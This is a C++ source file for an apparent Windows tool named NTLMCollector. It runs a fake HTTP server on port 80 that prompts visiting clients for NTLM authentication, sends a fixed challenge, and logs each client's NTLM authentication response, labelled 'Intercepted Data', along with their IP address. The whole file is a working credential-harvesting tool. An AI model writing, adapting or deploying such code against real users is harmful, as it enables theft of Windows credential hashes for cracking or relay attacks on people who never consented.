// NTLMCollector.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <tchar.h>
#include "windows.h"
#include "pcre_internal.h"
#include "pcre.h"

DWORD WINAPI ThreadProc(
  LPVOID lpParameter
);


int _tmain(int argc, _TCHAR* argv[])
{
	WSADATA wsaData;
	int err;

	err = WSAStartup( MAKEWORD( 2, 2 ), &wsaData );
	if ( err != 0 ) {
		return 1;
	}
	 
	SOCKET listener;
	sockaddr_in service;
	listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP );
	
	if ( listener == INVALID_SOCKET ) {
        printf("Error at socket(): listener\n");
        WSACleanup();
        return 1;
	}

    service.sin_family = AF_INET;
    service.sin_addr.s_addr = INADDR_ANY;
    service.sin_port = htons( 80 );

	if ( bind( listener, (sockaddr*)&service, sizeof(service) ) == SOCKET_ERROR ){
        printf("bind() failed.");
        closesocket(listener);
        WSACleanup();
        return 1;
	}

    // Listen on the socket.
	if ( listen( listener, SOMAXCONN ) == SOCKET_ERROR ){
        printf("Error listening on socket.");
        closesocket(listener);
        WSACleanup();
        return 1;
	}

    // Accept connections.
	SOCKET incoming;
	while (1) {
        incoming = accept( listener,NULL,NULL);
		if (SOCKET_ERROR==incoming) continue;
		CreateThread(NULL,0,ThreadProc,(LPVOID)incoming,0,NULL);
	}
	WSACleanup();
	return 0;
}

DWORD WINAPI ThreadProc(
  LPVOID lpParameter
  ){
static const char HttpResponse1[] = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: Keep-Alive\r\nContent-Length: 0\r\n\r\n";
static const char HttpResponse2[] = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM TlRMTVNTUAACAAAADgAOADgAAAAFgoGiUtCewfgxY2YAAAAAAAAAAHAAcABGAAAABQCTCAAAAA9EAFUATABXAEkAQwBIAAIADgBEAFUATABXAEkAQwBIAAEACgBMAEUATQBPAE4ABAAcAGQAdQBsAHcAaQBjAGgALgBvAHIAZwAuAHUAawADACgAbABlAG0AbwBuAC4AZAB1AGwAdwBpAGMAaAAuAG8AcgBnAC4AdQBrAAAAAAA=\r\nContent-Length: 0\r\n\r\n";
static const char HttpResponse3[] = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";

#define OVECCOUNT 10
	SOCKET incoming = (SOCKET)lpParameter;
	sockaddr_in addr;
	int iLen;
	char Buf[32*1024],txtBuf[4*1024];
	FILE *file;
	pcre *reheader,*rentlm;
	const char *error;
	int erroffset;
	int rc,i;
	int ovector[OVECCOUNT];

	///Initialise PCRE///////////////////////
    reheader = pcre_compile(
		"GET[^\\r\\n]+HTTP/1\\.[01]",              /* the pattern */
		0,                    /* default options */
		&error,               /* for error message */
		&erroffset,           /* for error offset */
		NULL);                /* use default character tables */
	//ASSERT(reheader!=NULL);
    rentlm = pcre_compile(
		"NTLM ([a-zA-Z0-9\\+/=]+)",              /* the pattern */
		0,                    /* default options */
		&error,               /* for error message */
		&erroffset,           /* for error offset */
		NULL);                /* use default character tables */
	//ASSERT(rentlm!=NULL);

	//Create Random Log File//////////////////
	sprintf(Buf,"%d",GetTickCount());
	file = fopen(Buf,"wt");

	/////Log IP Address//////////////////
	iLen = sizeof(addr);
	getpeername(incoming,(sockaddr*)&addr,&iLen);
	unsigned IP = addr.sin_addr.s_addr;
	sprintf(Buf,"%d.%d.%d.%d connected\n",IP>>0&0xFF,IP>>8&0xFF,IP>>16&0xFF,IP>>24&0xFF);
	fwrite(Buf,strlen(Buf),1,file);
	printf(Buf);

	/////Read HTTP Request//////////////////
	iLen = recv(incoming,Buf,sizeof(Buf),0);
	if (SOCKET_ERROR==iLen) goto cleanup;
	
	rc = pcre_exec(reheader,NULL,Buf,iLen,0,0,0,0);
	if (rc<0) {
		fwrite("Matching HTTP Header Error,Original Header:",43,1,file);
		fwrite(Buf,iLen,1,file);
		goto cleanup;
	}
	
	///////Response 1//////////////////////
	iLen = send(incoming,HttpResponse1,strlen(HttpResponse1),0);
	if (iLen!=strlen(HttpResponse1)) {
		fwrite("Send HttpResponse1 Error",24,1,file);
		goto cleanup;
	}

	////Read HTTP Request 2///////////////////
	iLen = recv(incoming,Buf,sizeof(Buf),0);
	if (SOCKET_ERROR==iLen) goto cleanup;
	
	rc = pcre_exec(rentlm,NULL,Buf,iLen,0,0,0,0);
	if (rc<0) {
		fwrite("Matching HTTP Header2(NTLM) Error,Original Header:",50,1,file);
		fwrite(Buf,iLen,1,file);
		goto cleanup;
	}

	///////Response 2//////////////////////
	iLen = send(incoming,HttpResponse2,strlen(HttpResponse2),0);
	if (iLen!=strlen(HttpResponse2)) {
		fwrite("Send HttpResponse2 Error",24,1,file);
		goto cleanup;
	}

	////Read HTTP Request 3///////////////////
	iLen = recv(incoming,Buf,sizeof(Buf),0);
	if (SOCKET_ERROR==iLen) goto cleanup;
	
	rc = pcre_exec(rentlm,NULL,Buf,iLen,0,0,ovector,OVECCOUNT);
	if (rc!=2) {
		fwrite("Matching HTTP Header3(NTLM) Error,Original Header:",50,1,file);
		fwrite(Buf,iLen,1,file);
		goto cleanup;
	}
	//////Parse NTLM Data///////////////
	char *substring_start = Buf + ovector[2];
	int substring_length = ovector[3] - ovector[2];
	sprintf(txtBuf,"Intercepted Data:\n%.*s", substring_length, substring_start);
	fwrite(txtBuf,strlen(txtBuf),1,file);

	iLen = send(incoming,HttpResponse3,strlen(HttpResponse3),0);
	if (iLen!=strlen(HttpResponse3)) {
		fwrite("Send HttpResponse3 Error",24,1,file);
		goto cleanup;
	}


cleanup:
	fclose(file);
	pcre_free(reheader);
	pcre_free(rentlm);
	closesocket(incoming);
	return 0;
}

